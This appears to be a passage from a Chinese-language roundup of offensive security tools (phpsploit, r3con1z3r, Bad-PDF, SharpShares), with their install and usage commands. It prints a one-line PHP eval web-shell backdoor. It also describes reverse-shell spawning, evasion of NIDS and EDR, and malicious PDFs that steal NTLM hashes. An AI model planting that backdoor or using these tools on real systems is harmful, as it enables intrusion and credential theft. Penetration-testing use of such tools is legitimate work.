1.phpsploit

介绍

使用标准客户端请求下的HTTP标头和Web服务器的相对响应，通过一个微小的多态后门进行隧道传输，从而实现了模糊通信：

&lt;?php @eval($_SERVER['HTTP_PHPSPL01T']); ?&gt;

安装

git clone https://github.com/nil0x42/phpsploit
cd phpsploit/
pip3 install -r requirements.txt
./phpsploit --interactive --eval "help help"

特点

高效：超过20个插件可自动执行权限提升任务

•运行命令并浏览文件系统，绕过PHP安全限制•在客户端和目标之间上传/下载文件•通过本地文本编辑器编辑远程文件•在目标系统上运行SQL控制台•生成反向TCP Shell

隐身：该框架是由偏执狂创建的，用于偏执狂

•通过日志分析和NIDS签名检测几乎看不见•安全模式和常见PHP安全性限制绕过•通信隐藏在HTTP标头中•加载的负载被混淆以绕过NIDS•http / https / socks4 / socks5代理支持

方便：具有许多关键功能的强大界面

•任何选项的详细帮助（help命令）•客户端和服务器上的跨平台。•CLI支持自动完成和多命令•会话保存/加载功能和永久历史记录•对大型有效负载（例如上传）的多请求支持•提供强大的，高度可配置的设置引擎•每个设置（例如用户代理）都有一个多态模式•用于插件交互的可定制环境变量•提供完整的插件开发API

3.r3con1z3r

介绍

R3con1z3r是一个轻量级的Web信息收集工具，具有用python编写的直观功能。它提供了一个强大的环境，可以在其中快速，彻底地进行基于开源情报（OSINT）基于Web的足迹管理。

足迹是道德黑客的第一阶段，它收集有关目标的所有可能信息。R3con1z3r是一种被动侦听工具，具有内置功能，其中包括：HTTP标头标志，Traceroute，Whois足迹，DNS信息，同一服务器上的站点，Nmap端口扫描程序，反向目标和网页上的超链接。在提供必要的输入后，该工具将以HTML格式生成输出。

安装

# install from pypi
   pip install r3con1z3r

依赖模块

pip install win_unicode_console colorama

使用

    # `domain.com` is the website to perform footprinting on
    r3con1z3r -d domain.com

项目地址

https://github.com/abdulgaphy/r3con1z3r

7.Bad-PDF

介绍

Bad-PDF会创建恶意PDF文件，以从Windows计算机中窃取NTLM（NTLMv1 / NTLMv2）哈希，它利用检查点团队披露的漏洞来创建恶意PDF文件。Bad-Pdf使用Responder侦听器读取NTLM哈希。

此方法适用于所有PDF阅读器（任何版本） 大多数EDR /端点解决方案都无法检测到此攻击。

安装

git clone https://github.com/deepzec/Bad-Pdf
cd Bad-Pdf/
python badpdf.py

使用

python badpdf.py

12.SharpShares

介绍

SharpShares 是一个.NET实用工具，可以枚举共享：SharpShares是能够解析不同的输入类型并在网络上运行以查找SMB服务，进行身份验证并提取每个共享的ACL。

安装

.\ILMerge.exe /out:C:\SharpShares.exe .\SharpShares.exe .\LukeSkywalker.IPNetwork.dll

用法

参数:
   -targets       Targets to check
   -username      Username to authenticate with
   -domain        Domain to authenticate with
   -password      Password to authenticate with
   -jitter        Random sleep between 0 and X
   -tcp           Enable/Disable the default TCP check
   -grep          Print in a grepable format
   -acl           Attempt to get ACL for the shares
   -randomise     Loop through targets randomly

•文件路径

-targets="c:\users\admin\desktop\computers.txt"

•IP或子网的逗号分隔列表，例如

-targets="192.168.0.2,192.168.0.3"
-targets="192.168.0.0/24,192.168.1.0/24"

•破折号分隔：

-targets="192.168.0.12-192.168.0.252"

项目地址

https://github.com/mez-0/SharpShares
